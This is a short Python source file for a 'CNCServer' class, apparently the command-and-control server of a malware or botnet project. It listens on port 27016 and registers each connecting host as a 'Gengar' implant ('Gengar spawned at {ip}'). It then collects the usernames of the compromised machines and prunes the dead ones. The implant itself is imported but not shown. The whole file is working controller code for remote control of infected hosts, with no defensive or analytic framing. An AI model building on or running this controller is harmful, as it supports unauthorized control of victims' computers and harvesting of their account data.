import socket
import threading

from gengar import Gengar


class CNCServer:
    def __init__(self):
        self.gengars = []
        self._sock = socket.socket()
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind(('0.0.0.0', 27016))

    def listen(self):
        self._sock.listen(1)
        print('Waiting for connections.')
        accept_worker = threading.Thread(target=self._accept, daemon=True)
        accept_worker.start()

    def _accept(self):
        while True:
            conn, (ip, _) = self._sock.accept()
            print(f'Gengar spawned at {ip}')
            self.gengars.append(Gengar(conn))

    def close(self):
        self._sock.close()

    def fetch_usernames(self):
        return [gengar.username() for gengar in self.gengars]

    def filter_dead_gengars(self):
        return [gengar for gengar in self.gengars if gengar.is_alive()]
